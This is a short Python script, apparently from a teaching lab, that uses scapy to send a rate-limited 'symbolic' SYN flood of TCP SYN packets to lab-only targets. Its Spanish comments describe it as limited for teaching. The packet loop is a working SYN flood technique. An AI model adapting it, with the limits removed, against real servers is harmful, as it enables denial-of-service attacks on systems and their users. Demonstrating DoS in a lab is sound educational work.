#!/usr/bin/env python3
from __future__ import annotations

import argparse
import random
import time

from scapy.all import IP, TCP, RandShort, send

from common import print_banner, require_lab_ip, require_root_hint, setup_scapy


def main():
    parser = argparse.ArgumentParser(
        description=(
            "SYN flood simbólico y rate-limited para explicar DoS sin generar daño. "
            "Solo permite objetivos del laboratorio."
        )
    )
    parser.add_argument("--target", default="api-server")
    parser.add_argument("--port", type=int, default=9998)
    parser.add_argument("--count", type=int, default=40)
    parser.add_argument("--delay", type=float, default=0.05)
    args = parser.parse_args()

    require_root_hint()
    setup_scapy()

    target_ip = require_lab_ip(args.target)

    print_banner(f"Symbolic SYN flood -> {target_ip}:{args.port}")
    print(f"count={args.count} delay={args.delay}s")
    print("Este script es intencionalmente limitado para fines docentes.")

    for i in range(1, args.count + 1):
        pkt = IP(dst=target_ip) / TCP(
            sport=int(RandShort()),
            dport=args.port,
            flags="S",
            seq=random.randint(0, 2**32 - 1),
        )
        send(pkt, verbose=False)
        print(f"[{i:03d}] SYN enviado")
        time.sleep(args.delay)


if __name__ == "__main__":
    main()
